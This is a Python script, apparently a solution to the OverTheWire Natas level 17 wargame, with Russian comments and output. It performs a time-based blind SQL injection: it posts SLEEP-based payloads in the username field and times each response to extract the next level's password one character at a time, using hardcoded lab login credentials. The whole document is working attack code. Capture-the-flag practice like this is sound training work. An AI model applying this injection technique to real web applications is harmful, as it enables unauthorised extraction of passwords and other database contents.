import requests
import time
import string

URL = "http://natas17.natas.labs.overthewire.org/index.php"
AUTH = ("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")

SLEEP = 3
THRESHOLD = 2.5
CHARS = string.ascii_letters + string.digits

def check(payload):
    start = time.time()
    requests.post(URL, auth=AUTH, data={"username": payload}, timeout=30)
    return time.time() - start

password = ""

for pos in range(1, 33):  # пароль обычно 32 символа
    found = False
    for ch in CHARS:
        payload = (
            f'natas18" AND IF('
            f'ASCII(SUBSTRING(password,{pos},1))={ord(ch)},'
            f'SLEEP({SLEEP}),0) -- -'
        )

        elapsed = check(payload)

        if elapsed > THRESHOLD:
            password += ch
            print(f"[+] позиция {pos}: {ch} -> {password}")
            found = True
            break

    if not found:
        print(f"[-] символ на позиции {pos} не найден")
        break

print(f"\nПароль для natas18: {password}")